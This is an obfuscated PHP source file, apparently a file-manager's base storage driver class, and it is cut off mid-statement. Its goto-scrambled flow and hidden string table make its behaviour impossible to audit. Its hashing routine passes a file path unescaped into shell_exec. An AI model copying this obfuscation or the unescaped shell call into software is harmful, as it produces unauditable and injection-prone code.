<?php
 goto câ×ŠïÏ¼¶; C™¢Ë™‚©ø: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $AÔ­èé—Œ =& $_SERVER[œº]; $this->objectDriver = array($AÔ­èé—Œ[57], $AÔ­èé—Œ[58], $AÔ­èé—Œ[59], $AÔ­èé—Œ[60], $AÔ­èé—Œ[61], $AÔ­èé—Œ[62], $AÔ­èé—Œ[63], $AÔ­èé—Œ[64], $AÔ­èé—Œ[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($a²…İëÜ…í) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($a²…İëÜ…í, $_SERVER[œº][8]); } return $a²…İëÜ…í; } public function iconvApp($aÔ¸´†Ğ¨å) { return $aÔ¸´†Ğ¨å; } public function iconvSystem($BŒÏÙå‹âÙ) { return $BŒÏÙå‹âÙ; } public function iconvTo($B©ÏÊ‘¯•ô, $C÷óİµ , $A–øã–†šÄ) { goto d÷°’…õŞØ; d÷°’…õŞØ: $dëôÜÎ¶º… =& $_SERVER[œº]; if (!$B©ÏÊ‘¯•ô || !function_exists($dëôÜÎ¶º…[66])) { return $B©ÏÊ‘¯•ô; } static $e¡§Êâä½— = array(); goto a©‘¶Çîë; DèÙ“ˆ»Ó£: return $dÎ³¸÷µÁƒ; goto Bº’‡Ïµ’–; B®ùª«ñš: $dÎ³¸÷µÁƒ = $dÎ³¸÷µÁƒ ? $dÎ³¸÷µÁƒ : $B©ÏÊ‘¯•ô; if (strstr($dÎ³¸÷µÁƒ, $dëôÜÎ¶º…[70])) { $dÎ³¸÷µÁƒ = str_replace($dëôÜÎ¶º…[70], $dëôÜÎ¶º…[71], $dÎ³¸÷µÁƒ); } $e¡§Êâä½—[$C÷óİµ  . $dëôÜÎ¶º…[67] . $A–øã–†šÄ . $dëôÜÎ¶º…[68] . $B©ÏÊ‘¯•ô] = $dÎ³¸÷µÁƒ; goto e„«íÔ´í§; e„«íÔ´í§: $e¡§Êâä½—[$A–øã–†šÄ . $dëôÜÎ¶º…[67] . $C÷óİµ  . $dëôÜÎ¶º…[68] . $B©ÏÊ‘¯•ô] = $B©ÏÊ‘¯•ô; $e¡§Êâä½—[$A–øã–†šÄ . $dëôÜÎ¶º…[67] . $C÷óİµ  . $dëôÜÎ¶º…[68] . $dÎ³¸÷µÁƒ] = $B©ÏÊ‘¯•ô; $e¡§Êâä½—[$C÷óİµ  . $dëôÜÎ¶º…[67] . $A–øã–†šÄ . $dëôÜÎ¶º…[68] . $dÎ³¸÷µÁƒ] = $dÎ³¸÷µÁƒ; goto DèÙ“ˆ»Ó£; a©‘¶Çîë: $BË´¢ˆƒ ˜ = $C÷óİµ  . $dëôÜÎ¶º…[67] . $A–øã–†šÄ . $dëôÜÎ¶º…[68] . $B©ÏÊ‘¯•ô; if (isset($e¡§Êâä½—[$BË´¢ˆƒ ˜])) { return $e¡§Êâä½—[$BË´¢ˆƒ ˜]; } if (function_exists($dëôÜÎ¶º…[69])) { $dÎ³¸÷µÁƒ = @mb_convert_encoding($B©ÏÊ‘¯•ô, $A–øã–†šÄ, $C÷óİµ ); } else { $dÎ³¸÷µÁƒ = @iconv($C÷óİµ , $A–øã–†šÄ, $B©ÏÊ‘¯•ô); } goto B®ùª«ñš; Bº’‡Ïµ’–: } public function getPathInner($eÔñ¤µÇ±‹) { $B¯òŞÔ‚äÁ = IO::init($eÔñ¤µÇ±‹); return $B¯òŞÔ‚äÁ->path; } public function getPathOuter($a’äöù†Ùª) { $E„ÀªÂ™à =& $_SERVER[œº]; $dÉ‹±”ÁÜŞ = strlen(trim($this->pathBase, $E„ÀªÂ™à[8])); $a’äöù†Ùª = substr(trim($a’äöù†Ùª, $E„ÀªÂ™à[8]), $dÉ‹±”ÁÜŞ); return $this->pathDriver . $E„ÀªÂ™à[8] . ltrim($a’äöù†Ùª, $E„ÀªÂ™à[8]); } public function isParentOf($aÌ’ÀˆÉ–, $C‚„öº×Û¦) { $D°¹‰İ¬íé =& $_SERVER[œº]; $aÌ’ÀˆÉ– = rtrim(strtolower($aÌ’ÀˆÉ–), $D°¹‰İ¬íé[8]) . $D°¹‰İ¬íé[8]; $C‚„öº×Û¦ = rtrim(strtolower($C‚„öº×Û¦), $D°¹‰İ¬íé[8]) . $D°¹‰İ¬íé[8]; $F–çå…¢Ü = strpos($C‚„öº×Û¦, $aÌ’ÀˆÉ–) === 0; return $F–çå…¢Ü; } public function getType() { $f™¾Ãİ„“– =& $_SERVER[œº]; $C¯Ü½ãÃ¢ = str_replace($f™¾Ãİ„“–[72], $f™¾Ãİ„“–[33], get_class($this)); return strtolower($C¯Ü½ãÃ¢); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($fİÛ’Ÿ¼Ä…, $D‹ğØ—ÔÈÕ) { $føÈÁæ‹·ö =& $_SERVER[œº]; $B›”£‡òÉ = rtrim($fİÛ’Ÿ¼Ä…, $føÈÁæ‹·ö[8]) . $føÈÁæ‹·ö[8] . $D‹ğØ—ÔÈÕ; $cª…ÙÆ†¼Ñ = $this->exist($B›”£‡òÉ); return $cª…ÙÆ†¼Ñ ? $B›”£‡òÉ : !1; } public function setModifyTime($c”ê‘ßƒÕ, $D“Ô¦ç¶ª = '') { } public function renameObject($d…µ×«¾Ì, $CŸêÒÕç„š) { goto a¨óŠœÛ‹; a¨óŠœÛ‹: $bÔç˜ß±î =& $_SERVER[œº]; $AÙïç—ç„Á = $CŸêÒÕç„š; Hook::trigger($bÔç˜ß±î[73], $this, $d…µ×«¾Ì, $this, $this->pathFather($d…µ×«¾Ì) . $CŸêÒÕç„š); goto E‰Ì¯‰ª­«; E‰Ì¯‰ª­«: $d…µ×«¾Ì = $this->getPathOuter($d…µ×«¾Ì); $CŸêÒÕç„š = $this->pathFather($d…µ×«¾Ì) . $CŸêÒÕç„š; if (IO::isFile($d…µ×«¾Ì)) { $Dƒ‚ªš‹¤È = IO::copy($d…µ×«¾Ì, $this->pathFather($d…µ×«¾Ì), REPEAT_RENAME_FOLDER, $AÙïç—ç„Á); if ($Dƒ‚ªš‹¤È) { IO::remove($d…µ×«¾Ì); } } else { $Dƒ‚ªš‹¤È = IO::mkdir($CŸêÒÕç„š); if (!$Dƒ‚ªš‹¤È) { return !1; } $CÅ¤òğ„Ò• = IO::listPath($d…µ×«¾Ì, !0); $eÖ§°›ã¹ = array_merge($CÅ¤òğ„Ò•[$bÔç˜ß±î[74]], $CÅ¤òğ„Ò•[$bÔç˜ß±î[75]]); foreach ($eÖ§°›ã¹ as $d»„ËÌ«–Ş) { IO::move($d»„ËÌ«–Ş[$bÔç˜ß±î[76]], $CŸêÒÕç„š, REPEAT_RENAME_FOLDER); } IO::remove($d…µ×«¾Ì); } goto FóÂÜé¬­İ; FóÂÜé¬­İ: return $Dƒ‚ªš‹¤È ? $CŸêÒÕç„š : !1; goto B ¼ßŠÂ·; B ¼ßŠÂ·: } public function tempFile($Eäéô‘¶…‘ = '', $e ß¼™å¨– = '') { goto a•çÒÃ¾; a•çÒÃ¾: if (!$Eäéô‘¶…‘) { $Eäéô‘¶…‘ = rand_string(15); } $Bó ÅÀˆœâ = TEMP_FILES . rand_string(15) . $_SERVER[œº][8]; @mkdir($Bó ÅÀˆœâ, 511, !0); goto d”ïÆïâ·Ò; fæ êÆ†‹: return $EŒÅ®ä‚ ¢; goto b‰ãŒù®Šè; d”ïÆïâ·Ò: $EŒÅ®ä‚ ¢ = $Bó ÅÀˆœâ . $Eäéô‘¶…‘; @touch($EŒÅ®ä‚ ¢); if ($e ß¼™å¨–) { file_put_contents($EŒÅ®ä‚ ¢, $e ß¼™å¨–); } goto fæ êÆ†‹; b‰ãŒù®Šè: } public function tempFileRemve($E± È•ï»ç) { @unlink($E± È•ï»ç); @rmdir($this->pathFather($E± È•ï»ç)); } public function mkfile($dÎâå‘¾­ê, $fôŸ÷‘ = '', $c¬ãÇÎ‹„¶ = REPEAT_RENAME) { } public function mkdir($a³÷óñõò, $Bàî’Øí¬£ = REPEAT_SKIP) { } public function delFile($e»†¢¼ÓìÛ) { } public function delFolder($Få£ù®«ÜŒ) { } public function copyFile($fÀïæÛÓÓ, $Cª±ÛÚ¸Ä) { } public function moveFile($BË°Á°ÇñÊ, $bÃÓèº­Ç) { } public function remove($CÍºŞá‘¨) { if ($this->isFile($CÍºŞá‘¨)) { return $this->delFile($CÍºŞá‘¨); } return $this->delFolder($CÍºŞá‘¨); } public function rename($D­åÄ©Œ„, $c²æÑŞÄÌ˜) { } public function exist($føÀ£î“) { } public function findByHash($e´­·´¡² = '', $d´øçğ˜Õó = '') { return !1; } public function isFile($B›’–‹ÃŠ) { } public function isFolder($AÃ‚‘ÉÓ¾×) { } public function size($E ¹Ö„Ë¼³) { } public function info($e¸Î¹††¥) { } public function infoSimple($FïÆåñù“¸) { return $this->info($FïÆåñù“¸); } public function infoAuth($AÉã§¬ô±) { return $this->info($AÉã§¬ô±); } public function infoFull($d©È²Ê¢¹å) { return $this->info($d©È²Ê¢¹å); } public function infoWithChildren($AÄçÁŠ¥ù¡) { $F¹’ÑŞ•Å§ =& $_SERVER[œº]; static $C¸¡ªƒƒß¶ = array(); if (isset($C¸¡ªƒƒß¶[$AÄçÁŠ¥ù¡])) { return $C¸¡ªƒƒß¶[$AÄçÁŠ¥ù¡]; } $EÄ·»ÀÚë“ = $this->info($AÄçÁŠ¥ù¡); if ($EÄ·»ÀÚë“ && $EÄ·»ÀÚë“[$F¹’ÑŞ•Å§[29]] == $F¹’ÑŞ•Å§[77]) { $B¦Ô´äÁé© = array($F¹’ÑŞ•Å§[78] => 0, $F¹’ÑŞ•Å§[79] => 0, $F¹’ÑŞ•Å§[80] => 0); $this->infoChildren($AÄçÁŠ¥ù¡, $B¦Ô´äÁé©); $EÄ·»ÀÚë“[$F¹’ÑŞ•Å§[78]] = $B¦Ô´äÁé©[$F¹’ÑŞ•Å§[78]]; $EÄ·»ÀÚë“[$F¹’ÑŞ•Å§[81]] = array($F¹’ÑŞ•Å§[82] => $B¦Ô´äÁé©[$F¹’ÑŞ•Å§[79]], $F¹’ÑŞ•Å§[83] => $B¦Ô´äÁé©[$F¹’ÑŞ•Å§[80]]); $C¸¡ªƒƒß¶[$AÄçÁŠ¥ù¡] = $EÄ·»ÀÚë“; } return $EÄ·»ÀÚë“; } public function listPath($CÍÊ¹—¿ÄÉ, $eáŸâ¦È½ = false) { } public function has($aŞ¼šÜº²‰, $dÔ¹±³‹Ÿ = false, $FÓÌÎäğ‡ = false) { } public function canRead($cŒ÷¶•ÉÖÂ) { } public function canWrite($aç ß‹ø®ƒ) { } public function getContent($b²ÔÖáŞ¤) { } public function setContent($cŒå®Åä´, $dÀ¸Òäô© = '') { } protected function infoChildren($AÍÊìëİíä, &$Bö•„‹İ¸Ô) { $fŠöá†Ô¤œ =& $_SERVER[œº]; check_abort_echo(); $Dàœ¨³ƒ± = $this->listPath($AÍÊìëİíä, !0); $Dàœ¨³ƒ± = array_merge($Dàœ¨³ƒ±[$fŠöá†Ô¤œ[75]], $Dàœ¨³ƒ±[$fŠöá†Ô¤œ[74]]); foreach ($Dàœ¨³ƒ± as $FÍ×™‡İ—Ğ) { if ($FÍ×™‡İ—Ğ[$fŠöá†Ô¤œ[29]] == $fŠöá†Ô¤œ[77]) { $Bö•„‹İ¸Ô[$fŠöá†Ô¤œ[80]]++; $Bõ Ê¹·Š = $this->getPathInner($FÍ×™‡İ—Ğ[$fŠöá†Ô¤œ[76]]); $this->infoChildren($Bõ Ê¹·Š, $Bö•„‹İ¸Ô); } else { $Bö•„‹İ¸Ô[$fŠöá†Ô¤œ[79]]++; $Bö•„‹İ¸Ô[$fŠöá†Ô¤œ[78]] += $FÍ×™‡İ—Ğ[$fŠöá†Ô¤œ[78]]; } } } public function fileSubstr($Böâ®ù¨ ª, $d“è½Õ³‡¨, $C‡Ùˆ´ƒë) { } public function listAll($f¯ˆñŒ†³) { } public function listAllMake($CĞİƒá°, &$FäáÖå‰Îè) { $fèå†ÅÄ¹š =& $_SERVER[œº]; check_abort_echo(); $aŞÙ¸©¾§« = $this->listPath($CĞİƒá°, !0); if (!$aŞÙ¸©¾§«) { return; } $dÛ¸‰š·© = array_merge($aŞÙ¸©¾§«[$fèå†ÅÄ¹š[75]], $aŞÙ¸©¾§«[$fèå†ÅÄ¹š[74]]); foreach ($dÛ¸‰š·© as $AŒ§²ÎŞÆÍ) { goto cîÓ“µ¶¹¶; cîÓ“µ¶¹¶: $d’Åò¦¢Şº = $AŒ§²ÎŞÆÍ[$fèå†ÅÄ¹š[29]] == $fèå†ÅÄ¹š[77]; $eˆêˆ¶øø„ = array($fèå†ÅÄ¹š[76] => $AŒ§²ÎŞÆÍ[$fèå†ÅÄ¹š[76]], $fèå†ÅÄ¹š[77] => $d’Åò¦¢Şº); if (isset($AŒ§²ÎŞÆÍ[$fèå†ÅÄ¹š[78]])) { $eˆêˆ¶øø„[$fèå†ÅÄ¹š[78]] = $AŒ§²ÎŞÆÍ[$fèå†ÅÄ¹š[78]]; } goto f£ğ ¾Û†—; c”ÛˆÄİŞÑ: $this->listAllMake($AŒ§²ÎŞÆÍ[$fèå†ÅÄ¹š[76]], $FäáÖå‰Îè); goto BÊöÎ×éí°; f£ğ ¾Û†—: if (isset($AŒ§²ÎŞÆÍ[$fèå†ÅÄ¹š[84]])) { $eˆêˆ¶øø„[$fèå†ÅÄ¹š[84]] = $AŒ§²ÎŞÆÍ[$fèå†ÅÄ¹š[84]]; } if (!$d’Åò¦¢Şº) { $FäáÖå‰Îè[] = $eˆêˆ¶øø„; continue; } $FäáÖå‰Îè[] = $eˆêˆ¶øø„; goto c”ÛˆÄİŞÑ; BÊöÎ×éí°: } } public function listAllSimple($bµÕ¨µÌ) { $Eªä¹‰Å…› =& $_SERVER[œº]; $D§èÕ™Ãµ´ = array(); $CŠ¤«ÖÅù = $this->listAll($bµÕ¨µÌ); $Cò”‘›Š®¹ = $this->getPathOuter($bµÕ¨µÌ); foreach ($CŠ¤«ÖÅù as $Eº¼‘µƒŒ) { goto b²ğ¿â´‡Ì; aÂÈ­ğóÖò: if (!$Eº¼‘µƒŒ[$Eªä¹‰Å…›[77]]) { $a•ÇÏçĞë˜[$Eªä¹‰Å…›[86]] = $Eğµ¦Ÿïä«; } $D§èÕ™Ãµ´[] = $a•ÇÏçĞë˜; goto D¤ˆ‡šéÜİ; e•ã÷Àîå: $a•ÇÏçĞë˜ = array($Eªä¹‰Å…›[76] => $a®×ò•µªŠ, $Eªä¹‰Å…›[77] => $Eº¼‘µƒŒ[$Eªä¹‰Å…›[77]]); if (isset($Eº¼‘µƒŒ[$Eªä¹‰Å…›[78]]) && !$Eº¼‘µƒŒ[$Eªä¹‰Å…›[77]]) { $a•ÇÏçĞë˜[$Eªä¹‰Å…›[78]] = $Eº¼‘µƒŒ[$Eªä¹‰Å…›[78]]; } if (isset($Eº¼‘µƒŒ[$Eªä¹‰Å…›[84]])) { $a•ÇÏçĞë˜[$Eªä¹‰Å…›[84]] = $Eº¼‘µƒŒ[$Eªä¹‰Å…›[84]]; } goto aÂÈ­ğóÖò; b²ğ¿â´‡Ì: $Eğµ¦Ÿïä« = $Eº¼‘µƒŒ[$Eªä¹‰Å…›[76]]; $a®×ò•µªŠ = $Eº¼‘µƒŒ[$Eªä¹‰Å…›[76]]; if (isset($Eº¼‘µƒŒ[$Eªä¹‰Å…›[85]])) { $Eğµ¦Ÿïä« = $Eº¼‘µƒŒ[$Eªä¹‰Å…›[85]][$Eªä¹‰Å…›[76]]; $Eº¼‘µƒŒ[$Eªä¹‰Å…›[78]] = $Eº¼‘µƒŒ[$Eªä¹‰Å…›[85]][$Eªä¹‰Å…›[78]]; $Eº¼‘µƒŒ[$Eªä¹‰Å…›[84]] = $Eº¼‘µƒŒ[$Eªä¹‰Å…›[85]][$Eªä¹‰Å…›[84]]; } else { $a®×ò•µªŠ = substr($Eº¼‘µƒŒ[$Eªä¹‰Å…›[76]], strlen(get_path_father($Cò”‘›Š®¹))); $a®×ò•µªŠ = $Eªä¹‰Å…›[8] . ltrim($a®×ò•µªŠ, $Eªä¹‰Å…›[8]); } goto e•ã÷Àîå; D¤ˆ‡šéÜİ: } return $D§èÕ™Ãµ´; } public function upload($cİèªí¾×¶, $EÌ›³ãÒÔ, $c¤À»´¡¼Š = false, $Dï½âÒÓ…ğ = REPEAT_REPLACE) { } public function uploadFileByID($fËõËÍ•ã¦, $D­›äÖª³Š, $E¬¡›Ò«¢µ) { } public function uploadFileByPath($A˜‹¸±ñ±Ö, $DÈ¯İİ’¯è, $D•‚ØÀ½ñ¾ = array()) { } public function isUploadServer() { $d…¬â ì§™ =& $_SERVER[œº]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $d…¬â ì§™[87]) { return !0; } return $GLOBALS[$d…¬â ì§™[6]][$d…¬â ì§™[88]][$d…¬â ì§™[89]]; } public function isFileOutServer() { $c’ğ­ŞÅçÈ =& $_SERVER[œº]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $c’ğ­ŞÅçÈ[87]) { return !0; } return $GLOBALS[$c’ğ­ŞÅçÈ[6]][$c’ğ­ŞÅçÈ[88]][$c’ğ­ŞÅçÈ[90]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($BÓÃÏ½•–) { $d÷¦ËªÜİß =& $_SERVER[œº]; if (!$this->isCdnHost()) { return $BÓÃÏ½•–; } return str_replace(trim(get_url_root($BÓÃÏ½•–), $d÷¦ËªÜİß[8]), trim($this->cdnHost, $d÷¦ËªÜİß[8]), $BÓÃÏ½•–); } public function uploadLink($eèŒÄ§ö, $béæ¤é÷ = 0) { goto aŞõòÀŒ±è; Câ•íœËøß: if (!in_array($BÈòò Ïâ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $C›°¥æ°ôÖ = 1024 * 1024 * 10; goto FÑºĞ£À°; déÔÛ•Ÿ‹: if ($Eêè¯ƒÏÆ‡) { $Eêè¯ƒÏÆ‡[$c§Ûìõè¿[93]] = $eèŒÄ§ö; $Eêè¯ƒÏÆ‡[$c§Ûìõè¿[94]] = $BÈòò Ïâ; } return $Eêè¯ƒÏÆ‡; goto EìÊö‹Ô¬Š; aŞõòÀŒ±è: $c§Ûìõè¿ =& $_SERVER[œº]; if ($this->isUploadServer()) { return; } $BÈòò Ïâ = $this->getType(); goto Câ•íœËøß; FÑºĞ£À°: $F‰Šï»êç’ = $béæ¤é÷ <= $C›°¥æ°ôÖ ? $c§Ûìõè¿[91] : $c§Ûìõè¿[92]; $Aµä¯ßïÖ· = (!$béæ¤é÷ ? 1 : ceil($béæ¤é÷ / pow(1024, 3))) * 3600 * 4; $Eêè¯ƒÏÆ‡ = $this->{$F‰Šï»êç’}($eèŒÄ§ö, $Aµä¯ßïÖ·); goto déÔÛ•Ÿ‹; EìÊö‹Ô¬Š: } public function uploadFormData($bÓÈíÛŠ¼, $e’¿£¡òˆÎ = 3600) { } public function multiUploadFormData($có»ÚÃ‰ÏÙ, $Fß±¦–÷œï = 3600) { } public function download($cä¢ÇâŒœ°, $cµî¯ óã¬) { } public function ext($bÉ± …œÜ˜) { $dÑÈ·ŞÖÎ =& $_SERVER[œº]; if (strpos($bÉ± …œÜ˜, $dÑÈ·ŞÖÎ[8]) === -1) { $F‹¿ïÆÃéË = $bÉ± …œÜ˜; } else { $F‹¿ïÆÃéË = $this->pathThis($bÉ± …œÜ˜); } $aªÊ”¥è§ = $dÑÈ·ŞÖÎ[33]; if (strstr($F‹¿ïÆÃéË, $dÑÈ·ŞÖÎ[95])) { $aªÊ”¥è§ = substr($F‹¿ïÆÃéË, strrpos($F‹¿ïÆÃéË, $dÑÈ·ŞÖÎ[95]) + 1); $aªÊ”¥è§ = strtolower($aªÊ”¥è§); } if (strlen($aªÊ”¥è§) > 3 && preg_match($dÑÈ·ŞÖÎ[96], $aªÊ”¥è§, $eŠÇ·‰‰Œ)) { $aªÊ”¥è§ = $dÑÈ·ŞÖÎ[33]; } return $aªÊ”¥è§; } public function pathThis($c‹¡ëğã„) { $a„éË³ÒÌÄ =& $_SERVER[œº]; $c‹¡ëğã„ = str_replace($a„éË³ÒÌÄ[97], $a„éË³ÒÌÄ[8], rtrim($c‹¡ëğã„, $a„éË³ÒÌÄ[8])); $e¹÷ÖæÔ«Ú = strrpos($c‹¡ëğã„, $a„éË³ÒÌÄ[8]); if ($e¹÷ÖæÔ«Ú === !1) { return $c‹¡ëğã„; } return substr($c‹¡ëğã„, $e¹÷ÖæÔ«Ú + 1); } public function pathFather($bÏÇ©¬œœ…) { $FÚğŞÖİ“÷ =& $_SERVER[œº]; $bÏÇ©¬œœ… = str_replace($FÚğŞÖİ“÷[97], $FÚğŞÖİ“÷[8], rtrim($bÏÇ©¬œœ…, $FÚğŞÖİ“÷[8])); $eïª©½ƒØĞ = strrpos($bÏÇ©¬œœ…, $FÚğŞÖİ“÷[8]); if ($eïª©½ƒØĞ === !1) { return $FÚğŞÖİ“÷[33]; } return substr($bÏÇ©¬œœ…, 0, $eïª©½ƒØĞ + 1); } public function hashSimple($B¶Äïáêç) { goto c±óóˆ¹×ƒ; E´›‚Íí„: $eèö™©œã¶ = intval($F‚ÆÈ‘ç„ / $Dô„ªŠöÀ); $a…ø‚Ï’  = $CÅ„Œ±îƒÀ[33]; for ($eÖê“Œ•± = 0; $eÖê“Œ•± < $Dô„ªŠöÀ; $eÖê“Œ•±++) { $a…ø‚Ï’  .= $this->fileSubstr($B¶Äïáêç, $eèö™©œã¶ * $eÖê“Œ•±, $f…¿´ËÖâÄ); } goto bÔêÜ‰¿²Õ; BÍï„©èÖ´: $f…¿´ËÖâÄ = 200; $Dô„ªŠöÀ = 50; if ($F‚ÆÈ‘ç„ <= $f…¿´ËÖâÄ * $Dô„ªŠöÀ) { return $this->hashMd5($B¶Äïáêç) . $F‚ÆÈ‘ç„; } goto E´›‚Íí„; bÔêÜ‰¿²Õ: $a…ø‚Ï’  .= $this->fileSubstr($B¶Äïáêç, $F‚ÆÈ‘ç„ - $f…¿´ËÖâÄ, $f…¿´ËÖâÄ); return md5($a…ø‚Ï’ ) . $F‚ÆÈ‘ç„; goto e²çÇÒãœ; c±óóˆ¹×ƒ: $CÅ„Œ±îƒÀ =& $_SERVER[œº]; if (!$B¶Äïáêç) { return md5($CÅ„Œ±îƒÀ[33]); } $F‚ÆÈ‘ç„ = $this->size($B¶Äïáêç); goto BÍï„©èÖ´; e²çÇÒãœ: } public static $md5Cache = array(); public function hashMd5($A¬Œ·“‹»Ï) { $A¬Œ·“‹»Ï = $this->iconvSystem($A¬Œ·“‹»Ï); if (isset(self::$md5Cache[$A¬Œ·“‹»Ï])) { return self::$md5Cache[$A¬Œ·“‹»Ï]; } self::$md5Cache[$A¬Œ·“‹»Ï] = $this->hashMd5Shell($A¬Œ·“‹»Ï); if (!self::$md5Cache[$A¬Œ·“‹»Ï]) { self::$md5Cache[$A¬Œ·“‹»Ï] = @md5_file($A¬Œ·“‹»Ï); } return self::$md5Cache[$A¬Œ·“‹»Ï]; } private function hashMd5Shell($d“ä ³¡•Ï) { goto aÅÀ¨êÉ; Dºâ©Á±Ó: $bÕÍ–»ëÎ = Cache::get($BöÈôİË…Ş[101]); if (!$bÕÍ–»ëÎ) { $a‘†ƒ¢åÜŠ = BASIC_PATH . $BöÈôİË…Ş[102]; $bÖªæ´î´ = md5_file($a‘†ƒ¢åÜŠ); $bÕÍ–»ëÎ = $BöÈôİË…Ş[103]; foreach ($eœÂ¡÷´† as $aß‘ğ¿ÆĞ) { $cÔÓ—¨ÂÉÆ = shell_exec($aß‘ğ¿ÆĞ . "\x20\42{$a‘†ƒ¢åÜŠ}\42"); if ($cÔÓ—¨ÂÉÆ && substr(trim($cÔÓ—¨ÂÉÆ), 0, 32) == $bÖªæ´î´) { $bÕÍ–»ëÎ = $aß‘ğ¿ÆĞ; break; } } Cache::set($BöÈôİË…Ş[101], $bÕÍ–»ëÎ, 3600); } if ($bÕÍ–»ëÎ == $BöÈôİË…Ş[103]) { return !1; } goto EåìŸóõ—Ä; aÅÀ¨êÉ: $BöÈôİË…Ş =& $_SERVER[œº]; if (!function_exists($BöÈôİË…Ş[98])) { return !1; } $eœÂ¡÷´† = array($BöÈôİË…Ş[99], $BöÈôİË…Ş[100]); goto Dºâ©Á±Ó; EåìŸóõ—Ä: $cÔÓ—¨ÂÉÆ = shell_exec($bÕÍ–»ëÎ . "\x20\x22{$d“ä ³¡•Ï}\x22"); $cÔÓ—¨ÂÉÆ = str_replace($BöÈôİË…Ş[104], $BöÈôİË…Ş[33], $cÔÓ—¨ÂÉÆ); return substr($cÔÓ—¨ÂÉÆ, 0, 32); goto d×ßÄåˆƒ; d×ßÄåˆƒ: } public function link($b¢Ï‚“ƒó) { return $b¢Ï‚“ƒó; } public function fileOut($BïÇğ¶’ğš, $FÜ­¿Õ§ = false, $câÓñ´ÄÁï = false, $D¨Ûõ¼±ˆ† = '') { goto B„°†Ôœ; bÑã’ÏëĞß: if ($f˜òÏ²¡…Â) { $bµ´È¡ÆŠÄ = intval(1000 * 1000 * ($fƒ•î¦•ì÷ / $f˜òÏ²¡…Â)); } while ($cÅå÷ŒöÆ <= $D–œ˜¿¦¯«) { $Dáñ¶çêŠ¦ = timeFloat(); check_abort(); $eŞ‘¡”Ë¹ = $D–œ˜¿¦¯« - $cÅå÷ŒöÆ + 1; if ($eŞ‘¡”Ë¹ <= $fƒ•î¦•ì÷) { $fƒ•î¦•ì÷ = $eŞ‘¡”Ë¹; } echo $this->fileSubstr($BïÇğ¶’ğš, $cÅå÷ŒöÆ, $fƒ•î¦•ì÷); $cÅå÷ŒöÆ += $fƒ•î¦•ì÷; if ($fƒ•î¦•ì÷ == $eŞ‘¡”Ë¹) { $cÅå÷ŒöÆ = $D–œ˜¿¦¯« + 1; } if ($bµ´È¡ÆŠÄ) { $d‹´òéÏ¼õ = intval(1000 * 1000 * (timeFloat() - $Dáñ¶çêŠ¦)); $fØ…ßÑñÈİ = $bµ´È¡ÆŠÄ - $d‹´òéÏ¼õ; if ($fØ…ßÑñÈİ > 5) { usleep($fØ…ßÑñÈİ); } } } goto BÂÊ Ü½Ùõ; FĞèä©›á: $AŞçÁê•¢ø = $béïÓÊÈÏ[$e×Œ§Ø°Ü[78]]; $f–¦ ˜ÑÃ = gmdate($e×Œ§Ø°Ü[110], $béïÓÊÈÏ[$e×Œ§Ø°Ü[84]]); $e—ª¡¯Æ×Ê = $câÓñ´ÄÁï ? $câÓñ´ÄÁï : $this->iconvApp($béïÓÊÈÏ[$e×Œ§Ø°Ü[28]]); goto DÓ†“§ƒÊÌ; a…Ê®…‰: $bÁôšœÁœ« = get_file_mime($b¬‘ä°²«); if (strstr($bÁôšœÁœ«, $e×Œ§Ø°Ü[117])) { $bÁôšœÁœ« = $bÁôšœÁœ« . $e×Œ§Ø°Ü[118]; } if ($FÜ­¿Õ§ === !1 && !mime_support($bÁôšœÁœ«)) { $FÜ­¿Õ§ = !0; $bÁôšœÁœ« = $e×Œ§Ø°Ü[119]; } goto cÚ…òô´ß‰; fÍ‚­¢ìóô: $AìÊùÎ–œ± = $e×Œ§Ø°Ü[116] . $AìÊùÎ–œ± . $e×Œ§Ø°Ü[122] . $AìÊùÎ–œ±; if ($FÜ­¿Õ§) { header($e×Œ§Ø°Ü[123]); header($e×Œ§Ø°Ü[124] . $AìÊùÎ–œ±); } else { header($e×Œ§Ø°Ü[125] . $AìÊùÎ–œ±); } header($e×Œ§Ø°Ü[126] . gmdate($e×Œ§Ø°Ü[110], time() + 3600 * 24 * 30) . $e×Œ§Ø°Ü[127]); goto f»¨Á½¶; Aºë„øêè: $A¥Ñ¡ÄááŸ = $this->getType() == $e×Œ§Ø°Ü[106]; $Dßİ†Áå„‰ = $GLOBALS[$e×Œ§Ø°Ü[6]][$e×Œ§Ø°Ü[88]][$e×Œ§Ø°Ü[107]][$e×Œ§Ø°Ü[108]]; $f˜òÏ²¡…Â = (double) $GLOBALS[$e×Œ§Ø°Ü[6]][$e×Œ§Ø°Ü[88]][$e×Œ§Ø°Ü[107]][$e×Œ§Ø°Ü[109]] * 1024 * 1024; goto eŒ©Á›æÃ; D óˆİö£: if (in_array($b¬‘ä°²«, array($e×Œ§Ø°Ü[111], $e×Œ§Ø°Ü[112], $e×Œ§Ø°Ü[113], $e×Œ§Ø°Ü[114]))) { $b¬‘ä°²« = $e×Œ§Ø°Ü[115]; } if (!$D¨Ûõ¼±ˆ†) { $D¨Ûõ¼±ˆ† = md5($f–¦ ˜ÑÃ . $this->hashSimple($BïÇğ¶’ğš)); } $D¨Ûõ¼±ˆ† = $e×Œ§Ø°Ü[116] . $D¨Ûõ¼±ˆ† . $e×Œ§Ø°Ü[116]; goto a…Ê®…‰; f»¨Á½¶: header($e×Œ§Ø°Ü[128]); header($e×Œ§Ø°Ü[129]); header($e×Œ§Ø°Ü[130]); goto DÚ‡¨„º“‘; DğæçŒá†: $CÁç„Ìª‘í = strtolower($_SERVER[$e×Œ§Ø°Ü[142]]); if ($A¥Ñ¡ÄááŸ && $CÁç„Ìª‘í && $Dßİ†Áå„‰) { if (strstr($CÁç„Ìª‘í, $e×Œ§Ø°Ü[143])) { header($e×Œ§Ø°Ü[144] . $BïÇğ¶’ğš); } else { if (strstr($CÁç„Ìª‘í, $e×Œ§Ø°Ü[145])) { header($e×Œ§Ø°Ü[146] . $BïÇğ¶’ğš); } else { if (strstr($CÁç„Ìª‘í, $e×Œ§Ø°Ü[147])) { header($e×Œ§Ø°Ü[148] . $BïÇğ¶’ğš); } } } if 